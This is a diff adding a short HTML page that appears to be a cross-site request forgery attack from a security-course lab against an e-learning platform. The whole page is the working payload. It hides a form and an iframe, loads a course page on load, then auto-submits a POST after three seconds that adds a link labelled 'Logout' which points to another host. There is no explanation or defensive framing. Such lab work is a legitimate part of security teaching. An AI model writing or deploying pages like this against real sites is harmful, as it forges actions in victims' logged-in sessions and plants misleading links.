@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>My Form</title>
+    <style>
+      #myForm, #myIframe {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <form id="myForm" action="http://hackmelikeyoudo.csec.chatzi.org/modules/course_tools/course_tools.php?submit=yes&action=2" method="POST">
+      <label for="link">Link:</label>
+      <input type="text" name="link" id="link" value="http://securenet.puppies.chatzi.org/index.php"><br>
+      <label for="name_link">Name Link:</label>
+      <input type="text" name="name_link" id="name_link" value="Logout"><br>
+      <input type="hidden" name="form-submit" value="Προσθήκη" value="1">
+    </form>
+    <iframe id="myIframe" name="csrfiframe" src="http://hackmelikeyoudo.csec.chatzi.org/courses/TMA104/"></iframe>
+    <script>
+      function submitForm() {
+        document.getElementById("myForm").submit();
+      }
+      function submitIframe() {
+        document.getElementById("myIframe").contentWindow.location = "http://hackmelikeyoudo.csec.chatzi.org/courses/TMA104/";
+      }
+      submitIframe(); // submit the iframe on page load
+      setTimeout(submitForm, 3000); // submit the form after 3 seconds
+    </script>
+  </body>
+</html>
